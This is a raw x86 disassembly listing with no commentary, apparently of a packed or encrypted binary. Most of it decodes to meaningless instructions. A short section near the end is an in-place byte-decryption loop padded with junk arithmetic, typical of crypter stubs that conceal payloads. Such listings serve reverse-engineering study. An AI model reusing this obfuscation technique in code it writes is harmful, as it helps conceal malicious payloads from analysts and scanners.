  414f46:	fisubr DWORD PTR [eax-0x2a]
  414f49:	fst    DWORD PTR [edx+eiz*8]
  414f4c:	fcom   DWORD PTR [ebp+0xcf7b7a2]
  414f52:	xlat   BYTE PTR ds:[ebx]
  414f53:	jne    0x414fa2
  414f55:	sub    eax,DWORD PTR [ecx+0x31]
  414f58:	sbb    eax,0x2be58c46
  414f5d:	cmp    DWORD PTR [edi+0x43],esp
  414f60:	add    dl,ah
  414f62:	out    0xf3,eax
  414f64:	sar    DWORD PTR [ebx+esi*1],1
  414f67:	sub    al,0x8c
  414f69:	sub    eax,0x47bb669d
  414f6e:	inc    edi
  414f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f70:	out    0xea,eax
  414f72:	jns    0x414f39
  414f74:	in     eax,dx
  414f75:	in     al,0xba
  414f77:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414f79:	fs aas 
  414f7b:	and    DWORD PTR [esi+0x4e1d997],0xffffffcb
  414f82:	sar    ebx,0x86
  414f85:	xor    edi,DWORD PTR [edi]
  414f87:	fimul  DWORD PTR [edx+0x40]
  414f8a:	sub    dl,BYTE PTR [edi+eax*8+0x75a6d43c]
  414f91:	(bad)  
  414f92:	les    edi,FWORD PTR [esi-0x6c]
  414f95:	jo     0x414f9f
  414f97:	fimul  WORD PTR [edi+0x75dffd67]
  414f9d:	push   ds
  414f9e:	pop    edx
  414f9f:	cmp    eax,0x905f763a
  414fa4:	ret    
  414fa5:	shr    BYTE PTR [ebx-0x6f],cl
  414fa8:	jle    0x414fe2
  414faa:	inc    DWORD PTR [eax]
  414fac:	mov    eax,ds:0x5ec07ecf
  414fb1:	nop
  414fb2:	push   esp
  414fb3:	fild   WORD PTR [ebp+0x38]
  414fb6:	rcr    DWORD PTR [ebx],0x33
  414fb9:	xor    dh,dh
  414fbb:	push   eax
  414fbc:	push   0xfffffffc
  414fbe:	mov    dl,0x6b
  414fc0:	jl     0x415022
  414fc2:	cmp    DWORD PTR [esi+0x362df7d2],0x1f5e9180
  414fcc:	cmp    DWORD PTR [edi],esp
  414fce:	(bad)  
  414fcf:	and    BYTE PTR [edi-0x26],al
  414fd2:	or     al,0x35
  414fd4:	fs push edx
  414fd6:	sub    dl,dh
  414fd8:	or     al,BYTE PTR [ebp+0x75]
  414fdb:	xor    DWORD PTR [ecx+0x2a],0xd
  414fdf:	pop    edi
  414fe0:	fiadd  DWORD PTR [eax+0x57037d30]
  414fe6:	fbld   TBYTE PTR [ecx-0x5f]
  414fe9:	push   edi
  414fea:	fcomp  QWORD PTR [ebx-0x5d89c334]
  414ff0:	add    ebp,esp
  414ff2:	mov    ah,0xd6
  414ff4:	push   ebp
  414ff5:	or     ch,bh
  414ff7:	xlat   BYTE PTR ds:[ebx]
  414ff8:	aad    0x67
  414ffa:	popa   
  414ffb:	rcr    BYTE PTR [esi],1
  414ffd:	ror    BYTE PTR [edi+0x57],cl
  415000:	mov    al,0x97
  415002:	pop    ss
  415003:	in     al,dx
  415004:	test   BYTE PTR [esi+0xf],0xe8
  415008:	cmp    eax,DWORD PTR [eax]
  41500a:	stos   BYTE PTR es:[edi],al
  41500b:	std    
  41500c:	add    edx,DWORD PTR [edx-0x64]
  41500f:	xchg   edi,eax
  415010:	fiadd  WORD PTR [ecx+0x5]
  415013:	(bad)  
  415014:	mov    ds:0x6953475,al
  415019:	(bad)  
  41501a:	in     eax,dx
  41501b:	out    0xc8,eax
  41501d:	popf   
  41501e:	push   eax
  41501f:	aad    0x45
  415021:	repz mov ch,0xc3
  415024:	adc    BYTE PTR [eax],dh
  415026:	pop    esi
  415027:	mov    eax,0x75197698
  41502c:	mov    cl,0xcb
  41502e:	push   eax
  41502f:	dec    ecx
  415030:	cli    
  415031:	push   ss
  415032:	(bad)  
  415033:	imul   BYTE PTR [ecx]
  415035:	or     BYTE PTR [ecx+esi*8],al
  415038:	push   es
  415039:	xor    ecx,DWORD PTR [ecx]
  41503b:	test   dh,0xe7
  41503e:	repnz mov esp,0xdb490a7
  415044:	enter  0xad98,0x69
  415048:	or     eax,0xa660010b
  41504d:	test   BYTE PTR [eax-0xe2a1056],al
  415053:	repz jo 0x41505a
  415056:	add    eax,0xcceb221e
  41505b:	rol    DWORD PTR ds:0x82437610,1
  415061:	inc    edi
  415062:	mov    al,0x8f
  415064:	pop    edi
  415065:	pop    ds
  415066:	pop    edi
  415067:	push   ss
  415068:	outs   dx,BYTE PTR ds:[esi]
  415069:	(bad)  
  41506a:	lahf   
  41506b:	jl     0x414fed
  41506d:	ret    0x12be
  415070:	shl    ecx,cl
  415072:	adc    bl,BYTE PTR [ecx]
  415074:	push   esi
  415075:	aad    0x57
  415077:	sub    BYTE PTR [edi-0x427ae16a],dl
  41507d:	push   0x37b57c34
  415082:	retf   
  415083:	lock call DWORD PTR [esi]
  415086:	outs   dx,DWORD PTR ds:[esi]
  415087:	(bad)  
  415088:	scas   eax,DWORD PTR es:[edi]
  415089:	data16 stc 
  41508b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41508c:	or     al,0x32
  41508e:	shr    DWORD PTR [ecx+eax*8-0x22],1
  415092:	(bad)  
  415093:	fisttp WORD PTR [ebp-0x27]
  415096:	retf   
  415097:	xor    DWORD PTR ds:0xb333aff0,ecx
  41509d:	aad    0xa5
  41509f:	pop    ebp
  4150a0:	add    dl,BYTE PTR [edi-0x1366b205]
  4150a6:	daa    
  4150a7:	fwait
  4150a8:	cs jne 0x415054
  4150ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ac:	adc    ch,0xc6
  4150af:	mov    al,ds:0xd1e2df00
  4150b4:	je     0x4150c4
  4150b6:	xchg   ecx,eax
  4150b7:	inc    edx
  4150b8:	pop    esp
  4150b9:	rol    dl,1
  4150bb:	not    DWORD PTR [edx+0x3fe54e52]
  4150c1:	rcl    BYTE PTR [edi],0x71
  4150c4:	inc    ebp
  4150c5:	icebp  
  4150c6:	or     BYTE PTR [edx],al
  4150c8:	xchg   BYTE PTR [ecx+0x5f],cl
  4150cb:	cld    
  4150cc:	hlt    
  4150cd:	mov    bh,0x98
  4150cf:	test   esp,0x2550982a
  4150d5:	mov    ds:0xf0fdd18,al
  4150da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150db:	adc    DWORD PTR [edx+ebp*2-0x25af0e20],ebp
  4150e2:	rcr    al,1
  4150e4:	retf   0x9d5d
  4150e7:	stc    
  4150e8:	sbb    cl,BYTE PTR [eax+edi*2+0x2d2e0d4e]
  4150ef:	mov    bh,0x17
  4150f1:	sti    
  4150f2:	outs   dx,BYTE PTR ds:[esi]
  4150f3:	out    0xa1,al
  4150f5:	xchg   bh,dl
  4150f7:	jl     0x41508d
  4150f9:	sub    ebp,DWORD PTR [eax]
  4150fb:	push   esp
  4150fc:	call   0x8935ad34
  415101:	push   es
  415102:	pop    ss
  415103:	aad    0x29
  415105:	inc    eax
  415106:	push   0xffffffe7
  415108:	out    dx,eax
  415109:	retf   0x73a6
  41510c:	add    al,0x89
  41510e:	clc    
  41510f:	xchg   BYTE PTR [ebp-0x46],dh
  415112:	es push eax
  415114:	jl     0x4150c6
  415116:	dec    ebp
  415117:	jo     0x41517f
  415119:	adc    edi,eax
  41511b:	retf   0x8d1a
  41511e:	or     bl,dl
  415120:	js     0x415106
  415122:	fs fcmovnbe st,st(7)
  415125:	pop    esi
  415126:	mov    ebp,0xd5d50952
  41512b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41512c:	pushf  
  41512d:	pop    esi
  41512e:	std    
  41512f:	sbb    DWORD PTR [eax-0x2a0d59ae],0xfffffff4
  415136:	or     edi,DWORD PTR [ecx-0xa]
  415139:	je     0x415174
  41513b:	dec    eax
  41513c:	fisttp DWORD PTR [ecx+0x1b]
  41513f:	dec    ebp
  415140:	pop    ds
  415141:	dec    esi
  415142:	call   0x4573:0xdf6e4e90
  415149:	neg    bl
  41514b:	inc    ebp
  41514c:	xchg   edx,eax
  41514d:	js     0x415104
  41514f:	jo     0x415135
  415151:	mov    bl,0x47
  415153:	cmp    eax,0x81a1ed1f
  415158:	and    bl,BYTE PTR [ebx]
  41515a:	je     0x4151c4
  41515c:	out    0xf9,eax
  41515e:	cmp    al,0xfe
  415160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415161:	xlat   BYTE PTR ds:[ebx]
  415162:	jle    0x4150fa
  415164:	adc    eax,0x1f04d5b9
  415169:	shl    DWORD PTR [esi+0x4de9da25],0x86
  415170:	xlat   BYTE PTR ds:[ebx]
  415171:	nop
  415172:	cwde   
  415173:	bound  edi,QWORD PTR [eax]
  415175:	aad    0xeb
  415177:	in     eax,dx
  415178:	das    
  415179:	or     bh,bh
  41517b:	and    BYTE PTR [eax+0x66],cl
  41517e:	jnp    0x41518f
  415180:	test   BYTE PTR [esi-0x38fffff9],ah
  415186:	inc    ebp
  415187:	call   0x41618d
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	popa   
  4151a5:	pop    esi
  4151a6:	push   0xffffffd1
  4151a8:	cmp    al,0xb0
  4151aa:	mov    esi,0xbec4edbe
  4151af:	mov    esi,0xd9777a86
  4151b4:	in     eax,dx
  4151b5:	mov    dh,0xcd
  4151b7:	sub    BYTE PTR [edx+0x3a1fe4d9],0x5c
  4151be:	push   0xffffffcf
  4151c0:	ret    0x868c
  4151c3:	pop    edi
  4151c4:	jg     0x415196
  4151c6:	leave  
  4151c7:	mov    WORD PTR [ecx],?
  4151c9:	(bad)  
  4151ca:	movsx  eax,WORD PTR [ebx]
  4151cd:	cmp    al,0x67
  4151cf:	ja     0x415211
  4151d1:	fdiv   QWORD PTR [eax-0x1de59303]
  4151d7:	ja     0x4151fe
  4151d9:	lods   al,BYTE PTR ds:[esi]
  4151da:	outs   dx,BYTE PTR ds:[esi]
  4151db:	xchg   ecx,eax
  4151dc:	retf   0x7fdc
  4151df:	gs retf 
  4151e1:	in     al,dx
  4151e2:	je     0x41516e
  4151e4:	jbe    0x415187
  4151e6:	cmp    ebp,DWORD PTR [edi+0x2]
  4151e9:	pop    es
  4151ea:	xor    eax,0x2fd7f818
  4151ef:	inc    esi
  4151f0:	shl    DWORD PTR [esp+edx*1+0x1734a100],cl
  4151f7:	arpl   WORD PTR [ecx-0x5b],dx
  4151fa:	jbe    0x415181
  4151fc:	lahf   
  4151fd:	push   ebx
  4151fe:	mov    edx,0x52983d7b
  415203:	arpl   WORD PTR [ebp+eax*8-0x3],si
  415207:	jno    0x4151aa
  415209:	jle    0x415194
  41520b:	popf   
  41520c:	sub    eax,0xc5f7d974
  415211:	pop    ebx
  415212:	sbb    BYTE PTR [edx-0xd],bh
  415215:	and    DWORD PTR [ebx+0x595e46ae],ecx
  41521b:	not    DWORD PTR [eax-0x52]
  41521e:	pop    esp
  41521f:	add    ah,BYTE PTR [edx]
  415221:	stos   DWORD PTR es:[edi],eax
  415222:	jmp    0xa40008c1
  415227:	mov    ebx,0x43219264
  41522c:	ins    BYTE PTR es:[edi],dx
  41522d:	je     0x41520e
  41522f:	jo     0x41527d
  415231:	aaa    
  415232:	outs   dx,DWORD PTR ds:[esi]
  415233:	push   cs
  415234:	fisttp DWORD PTR [esi-0x3b]
  415237:	ret    0xfb96
  41523a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41523b:	int    0x6d
  41523d:	stos   BYTE PTR es:[edi],al
  41523e:	jnp    0x415285
  415240:	(bad)  
  415241:	pop    ebp
  415242:	imul   eax,DWORD PTR [edx-0x1536c8ad],0xffffff8b
  415249:	mov    WORD PTR [ecx],ss
  41524b:	and    eax,0x8395224b
  415250:	pop    esi
  415251:	add    ebx,ebp
  415253:	or     DWORD PTR ds:0x54590333,esi
  415259:	or     edx,DWORD PTR [esp+ecx*8]
  41525c:	jmp    0x42135d8a
  415261:	jle    0x41526e
  415263:	ret    0xf8be
  415266:	ret    
  415267:	adc    bl,BYTE PTR [eax+esi*2+0x60]
  41526b:	int3   
  41526c:	into   
  41526d:	ss pop ecx
  41526f:	lods   al,BYTE PTR ds:[esi]
  415270:	(bad)  
  415271:	fcomp  QWORD PTR [eax-0x38]
  415274:	js     0x41523d
  415276:	fidiv  WORD PTR [eax-0x4956342f]
  41527c:	idiv   ebx
  41527e:	in     al,dx
  41527f:	in     al,0x58
  415281:	pop    esi
  415282:	fwait
  415283:	pusha  
  415284:	data16 hlt 
  415286:	scas   eax,DWORD PTR es:[edi]
  415287:	add    ebp,DWORD PTR ss:[eax]
  41528a:	dec    ecx
  41528b:	pop    ebp
  41528c:	(bad)  
  41528d:	jae    0x415258
  41528f:	neg    DWORD PTR [eax-0x69]
  415292:	adc    ch,ch
  415294:	scas   al,BYTE PTR es:[edi]
  415295:	test   al,0x7
  415297:	mov    ah,0x62
  415299:	adc    DWORD PTR [edi],ecx
  41529b:	xchg   ecx,eax
  41529c:	xchg   ebx,eax
  41529d:	mov    ebp,0xe341bc16
  4152a2:	ror    DWORD PTR ds:0x90d8034b,cl
  4152a8:	clc    
  4152a9:	jb     0x41528e
  4152ab:	(bad)  
  4152ac:	mov    dl,0xc2
  4152ae:	push   ss
  4152af:	vxorpd ymm0,ymm7,ymm2
  4152b3:	rcr    BYTE PTR [edx-0x13c7ec55],0xc6
  4152ba:	sbb    ebp,edx
  4152bc:	xchg   edi,eax
  4152bd:	fistp  WORD PTR [edx]
  4152bf:	xor    ch,BYTE PTR [ebx+eax*8-0x3e]
  4152c3:	pop    edi
  4152c4:	or     al,0xc0
  4152c6:	ins    DWORD PTR es:[edi],dx
  4152c7:	xor    eax,0xc8a96311
  4152cc:	scas   al,BYTE PTR es:[edi]
  4152cd:	scas   al,BYTE PTR es:[edi]
  4152ce:	jno    0x41527d
  4152d0:	scas   al,BYTE PTR es:[edi]
  4152d1:	imul   ecx,DWORD PTR [ebx-0x6343a24d],0x62a18486
  4152db:	push   es
  4152dc:	test   al,0xfa
  4152de:	add    al,0x30
  4152e0:	dec    eax
  4152e1:	xchg   ebx,eax
  4152e2:	leave  
  4152e3:	xchg   esp,eax
  4152e4:	cmp    eax,0x3d78df1e
  4152e9:	pop    esi
  4152ea:	in     eax,0x16
  4152ec:	sahf   
  4152ed:	xchg   BYTE PTR [edx+0x4bad0182],ch
  4152f3:	mov    eax,ds:0x3f5855cf
  4152f8:	mov    ds:0xce8fe1a8,eax
  4152fd:	(bad)  
  4152fe:	leave  
  4152ff:	or     esp,ecx
  415301:	mov    dh,0x65
  415303:	ja     0x4152fc
  415305:	mov    ebp,ebx
  415307:	gs es mov edi,0xc947d974
  41530e:	xor    DWORD PTR [edi-0x71],ebx
  415311:	es das 
  415313:	xchg   BYTE PTR [eax+0x73bbc7ae],ch
  415319:	adc    cl,BYTE PTR [edi+0x2df11e65]
  41531f:	cmp    DWORD PTR [edi+0x3bd0cd2],ebp
  415325:	call   0x31cde907
  41532a:	dec    ebp
  41532b:	mov    eax,gs:0x6e43df21
  415331:	inc    esp
  415332:	rol    ebp,1
  415334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415335:	sbb    ch,dh
  415337:	and    DWORD PTR [ebx-0x2d],0xffffffb9
  41533b:	xchg   BYTE PTR [ebp-0x64333c57],al
  415341:	and    DWORD PTR [edi+0x68],esi
  415344:	aaa    
  415345:	xor    dl,BYTE PTR [edi]
  415347:	xchg   esi,eax
  415348:	arpl   WORD PTR [ebp+0x5aa130c8],sp
  41534e:	jle    0x415350
  415350:	out    0x69,eax
  415352:	cmp    DWORD PTR [esi+0x4fbb7de1],ebx
  415358:	clc    
  415359:	xor    eax,0x7e67ff14
  41535e:	ins    BYTE PTR es:[edi],dx
  41535f:	inc    ebp
  415360:	inc    esp
  415361:	pop    ebx
  415362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415363:	scas   eax,DWORD PTR es:[edi]
  415364:	mov    bl,0xb6
  415366:	push   eax
  415367:	lods   eax,DWORD PTR ds:[esi]
  415368:	arpl   WORD PTR [edx*8+0x57776c60],sp
  41536f:	in     al,dx
  415370:	call   0xa5ea:0x6d1b585b
  415377:	cs sahf 
  415379:	add    al,0xfd
  41537b:	inc    esp
  41537c:	cwde   
  41537d:	add    eax,0x414ea148
  415382:	cmc    
  415383:	fadd   st,st(7)
  415385:	mov    dh,0x5
  415387:	mov    edi,0x8bd70eea
  41538c:	inc    ebx
  41538d:	sub    dl,BYTE PTR [eax]
  41538f:	scas   eax,DWORD PTR es:[edi]
  415390:	adc    edx,DWORD PTR [edx]
  415392:	mov    ch,0x19
  415394:	xor    edx,DWORD PTR [edx-0x53c8dec7]
  41539a:	mov    ah,BYTE PTR [ebx]
  41539c:	fcomip st,st(1)
  41539e:	and    edx,DWORD PTR [eax-0x10]
  4153a1:	lods   eax,DWORD PTR ds:[esi]
  4153a2:	jns    0x415327
  4153a4:	and    eax,0xb6bf79e2
  4153a9:	hlt    
  4153aa:	aam    0xf2
  4153ac:	and    al,0x52
  4153ae:	xor    dl,BYTE PTR [edi-0x4d]
  4153b1:	test   DWORD PTR [ebx+0x7788186b],eax
  4153b7:	pushf  
  4153b8:	cmp    ah,BYTE PTR [esi+edi*2+0x4c]
  4153bc:	aas    
  4153bd:	mov    dl,0x73
  4153bf:	(bad)  
  4153c0:	loop   0x4153ab
  4153c2:	dec    ebx
  4153c3:	repz inc ebx
  4153c5:	nop
  4153c6:	mov    esi,0x6abe4568
  4153cb:	in     al,0xb2
  4153cd:	push   ebx
  4153ce:	stc    
  4153cf:	scas   al,BYTE PTR es:[edi]
  4153d0:	addr16 mov bl,0x24
  4153d3:	sub    DWORD PTR [edi+0x50],eax
  4153d6:	in     al,dx
  4153d7:	(bad)  
  4153d8:	mov    ah,0x5d
  4153da:	push   eax
  4153db:	rol    DWORD PTR [eax],0x25
  4153de:	cmp    cl,BYTE PTR [eax+0x3269f411]
  4153e4:	pop    edx
  4153e6:	jns    0x415458
  4153e8:	(bad)  
  4153e9:	pop    ebx
  4153ea:	inc    DWORD PTR [eax-0x74]
  4153ed:	out    dx,eax
  4153ee:	(bad)  
  4153ef:	push   ss
  4153f0:	retf   
  4153f1:	or     BYTE PTR [edx+ebx*2],bh
  4153f4:	das    
  4153f5:	pop    ds
  4153f6:	and    ecx,ebx
  4153f8:	jle    0x415408
  4153fa:	push   0xffffffdd
  4153fc:	push   cs
  4153fd:	cmp    al,ah
  4153ff:	jno    0x415436
  415401:	mov    eax,0x38779b9a
  415406:	inc    ecx
  415407:	ds dec edx
  415409:	cmc    
  41540a:	or     edi,esp
  41540c:	mov    ebp,0xe6f5a38a
  415411:	jo     0x4153d5
  415413:	out    0xea,al
  415415:	xor    dh,bl
  415417:	ret    0x9212
  41541a:	aaa    
  41541b:	xor    bh,0xa9
  41541e:	js     0x41546e
  415420:	jle    0x415428
  415422:	sub    al,BYTE PTR [esi+0x6cfd9f8b]
  415428:	(bad)  
  415429:	ds xchg esp,eax
  41542b:	push   0x4f
  41542d:	call   0xad12489f
  415432:	cmp    DWORD PTR [eax],ebx
  415434:	mov    ds:0xe31925c7,eax
  415439:	push   0x45
  41543b:	bndldx (bad),[ebp-0x76]
  41543f:	lahf   
  415440:	or     DWORD PTR [esi],ecx
  415442:	loopne 0x4154b7
  415444:	mov    dl,0xa
  415446:	xor    eax,DWORD PTR [ebp-0x13]
  415449:	test   dl,cl
  41544b:	jb     0x41545a
  41544d:	mov    cl,0xff
  41544f:	pusha  
  415450:	aaa    
  415451:	add    BYTE PTR [ebp+0x36],dl
  415454:	in     al,dx
  415455:	and    bh,BYTE PTR [edx]
  415457:	(bad)  
  415458:	imul   eax,DWORD PTR [ecx],0xffffffff
  41545b:	stos   BYTE PTR es:[edi],al
  41545c:	outs   dx,BYTE PTR ds:[esi]
  41545d:	push   ebp
  41545e:	cld    
  41545f:	inc    esp
  415460:	adc    al,0x58
  415462:	loop   0x41546f
  415464:	cmp    BYTE PTR [edx-0x6c7840ec],0x5b
  41546b:	jne    0x4154e5
  41546d:	fwait
  41546e:	cmp    ah,BYTE PTR [ecx-0x4f]
  415471:	inc    esp
  415472:	ss xor eax,0x8bcdcc19
  415478:	bound  eax,QWORD PTR [ebx+0x71]
  41547b:	inc    ecx
  41547c:	mov    esp,0xe1ebe5a
  415481:	mov    cl,dh
  415483:	shl    DWORD PTR [eax-0x18fdb35],cl
  415489:	shr    BYTE PTR ss:[edx+0x41cd57c5],cl
  415490:	xor    BYTE PTR [ebx],dl
  415492:	lods   eax,DWORD PTR ds:[esi]
  415493:	test   BYTE PTR [ebp+0x6b],bh
  415496:	add    eax,0x67cfdbec
  41549b:	and    DWORD PTR [ecx-0x577fe0db],esp
  4154a1:	mov    DWORD PTR [ecx],edx
  4154a3:	cmp    bl,BYTE PTR [esi-0x59]
  4154a6:	lahf   
  4154a7:	sbb    eax,0xec0eefca
  4154ac:	mov    edi,0x60bb6bef
  4154b1:	mov    ah,0x97
  4154b3:	cmp    edx,edx
  4154b5:	mov    eax,0xbac4aeca
  4154ba:	jnp    0x41545d
  4154bc:	ret    0xbc39
  4154bf:	div    DWORD PTR [eax+0x43f76943]
  4154c5:	cmp    DWORD PTR [edi+0x7de70041],ebp
  4154cb:	add    cl,BYTE PTR [edi]
  4154cd:	test   BYTE PTR [esi+0x0],bh
  4154d0:	add    BYTE PTR [eax],al
  4154d2:	mov    al,BYTE PTR [ecx+edi*1]
  4154d5:	mov    BYTE PTR [ebp-0x1],al
  4154d8:	mov    BYTE PTR [ebp-0x3],0x74
  4154dc:	mov    BYTE PTR [ebp-0x2],0x16
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fnsave [ecx+0x6ca4fcdc]
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	inc    edi
  41558e:	add    dh,BYTE PTR [ecx-0x76c9556d]
  415594:	xor    dl,ch
  415596:	(bad)  
  415597:	pusha  
  415598:	inc    ebp
  415599:	inc    ebx
  41559a:	adc    bl,0x8d
  41559d:	scas   al,BYTE PTR es:[edi]
  41559e:	in     al,0x3a
  4155a0:	add    BYTE PTR [edi],dh
  4155a2:	das    
  4155a3:	lock mov al,gs:0x7663a68c
  4155aa:	imul   esi,DWORD PTR [edi],0x7303c2cc
  4155b0:	lea    edx,[edi+eiz*4+0x3051a2f2]
  4155b7:	in     eax,dx
  4155b8:	in     eax,dx
  4155b9:	nop
  4155ba:	push   es
  4155bb:	cmp    DWORD PTR [ebx+0x34],esp
  4155be:	inc    ecx
  4155bf:	xor    eax,0xf972ae3a
  4155c4:	mov    esp,0xfffab8d1
  4155c9:	dec    eax
  4155ca:	sbb    DWORD PTR [ebx+ebx*1+0x49294402],0x5ccf5f1a
  4155d5:	mov    esi,0x6300984c
  4155da:	aas    
  4155db:	sbb    eax,0x16e294da
  4155e0:	retf   
  4155e1:	push   eax
  4155e2:	mov    edi,0x937759a4
  4155e7:	ja     0x415591
  4155e9:	or     DWORD PTR [ecx],ebp
  4155eb:	loop   0x415624
  4155ed:	jbe    0x4155ae
  4155ef:	out    0x3b,eax
  4155f1:	retf   
  4155f2:	or     ch,dl
  4155f4:	fs dec eax
  4155f6:	dec    eax
  4155f7:	sub    al,0xd1
  4155f9:	push   cs
  4155fa:	fsubr  QWORD PTR [ecx-0x564848ef]
  415600:	or     dl,bh
  415602:	push   0x3b
  415604:	call   0x679a:0xc71927d8
  41560b:	shl    DWORD PTR [ebx+0x7f],0x50
  41560f:	imul   esi,ebp,0x401e6278
  415615:	push   esi
  415616:	pusha  
  415617:	push   es
  415618:	and    dl,BYTE PTR [ebp+ecx*8-0x65]
  41561c:	std    
  41561d:	dec    ebp
  41561e:	fst    DWORD PTR [ebx-0x38]
  415621:	pop    edx
  415622:	xor    DWORD PTR [eax-0x5],eax
  415625:	xor    DWORD PTR [esi+0x45c3f1d0],ebx
  41562b:	(bad)  
  41562c:	arpl   WORD PTR [edx],di
  41562e:	mov    cl,0x1f
  415630:	sbb    DWORD PTR [ebx+0x11613761],ebp
  415636:	in     al,0x15
  415638:	inc    esi
  415639:	push   edx
  41563a:	pop    ds
  41563b:	in     eax,dx
  41563c:	mov    ah,BYTE PTR gs:[edx-0x289383bc]
  415643:	out    0x75,al
  415645:	cmc    
  415646:	xor    esp,DWORD PTR [edx]
  415648:	mov    esi,0xf14d505d
  41564d:	pop    ebp
  41564e:	out    dx,al
  41564f:	cmp    al,0xfc
  415651:	and    ebx,DWORD PTR [esi+0x3156813d]
  415657:	pop    esi
  415658:	jg     0x415699
  41565a:	ror    al,0xd8
  41565d:	and    BYTE PTR [esi],dl
  41565f:	pop    esi
  415660:	and    BYTE PTR [ebx-0x68bcc00c],ah
  415666:	inc    esp
  415667:	xchg   BYTE PTR [edi+0x3452a165],ah
  41566d:	sbb    BYTE PTR ds:0xef206b5c,ch
  415673:	sub    ebx,eax
  415675:	inc    eax
  415676:	ret    0x6f4d
  415679:	shr    BYTE PTR [eax+0x3a],cl
  41567c:	push   esp
  41567d:	or     eax,0x27390a32
  415682:	and    BYTE PTR [esi],dl
  415684:	out    dx,al
  415685:	mov    al,ds:0xdad1a01c
  41568a:	cld    
  41568b:	mov    ebx,0x6d7667cd
  415690:	aas    
  415691:	leave  
  415692:	shl    DWORD PTR [ecx-0x10],1
  415695:	fld    DWORD PTR [edx]
  415697:	stos   BYTE PTR es:[edi],al
  415698:	(bad)  
  415699:	sub    eax,0xd3157a06
  41569e:	fwait
  41569f:	mov    dl,0xee
  4156a1:	add    esp,DWORD PTR [ebx+0x77]
  4156a4:	mov    ah,0x26
  4156a6:	mov    al,bl
  4156a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a9:	pop    eax
  4156aa:	add    esi,DWORD PTR [edi+0xe964e97]
  4156b0:	(bad)  
  4156b1:	scas   al,BYTE PTR es:[edi]
  4156b2:	leave  
  4156b3:	and    esi,DWORD PTR ds:[ebx-0xa]
  4156b7:	sbb    eax,0x5557e312
  4156bc:	cld    
  4156bd:	cld    
  4156be:	sti    
  4156bf:	stmxcsr DWORD PTR [esi-0x18]
  4156c3:	ss and al,0x29
  4156c6:	(bad)  
  4156c8:	out    dx,al
  4156c9:	mov    BYTE PTR [edi+eiz*2+0x19],cl
  4156cd:	arpl   WORD PTR [edx-0x37622cf6],bx
  4156d3:	mov    dl,0xfd
  4156d5:	repnz inc ebp
  4156d7:	jge    0x415660
  4156d9:	std    
  4156da:	vandnps xmm7,xmm4,XMMWORD PTR fs:[edx+ecx*8-0x3524ae89]
  4156e4:	cs and eax,0x2c2f597
  4156ea:	sub    BYTE PTR [ebp-0x5bd017eb],cl
  4156f0:	push   ebp
  4156f1:	and    BYTE PTR [ebx+0x73],ch
  4156f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f5:	fcom   DWORD PTR [ebp-0x35c6e790]
  4156fb:	sub    bh,BYTE PTR [edx]
  4156fd:	dec    esp
  4156fe:	shr    BYTE PTR [esi],cl
  415700:	nop
  415701:	mov    ch,0x7b
  415703:	jbe    0x415765
  415705:	(bad)  
  415706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415707:	mov    ebp,0x8dce456e
  41570c:	xor    al,0x41
  41570e:	nop
  41570f:	cmp    ebp,esp
  415711:	add    al,0x23
